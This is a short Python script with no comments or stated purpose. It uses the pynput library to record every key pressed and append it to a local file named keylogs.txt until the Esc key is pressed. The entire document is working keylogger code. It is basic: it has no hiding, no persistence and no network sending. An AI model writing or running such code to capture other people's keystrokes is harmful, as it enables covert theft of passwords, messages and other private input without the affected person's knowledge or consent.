import pynput.keyboard

def on_press(key):
    try:
        with open("keylogs.txt", "a") as logfile:
            logfile.write(f"{key}\n")
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    if key == pynput.keyboard.Key.esc:
        return False

with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
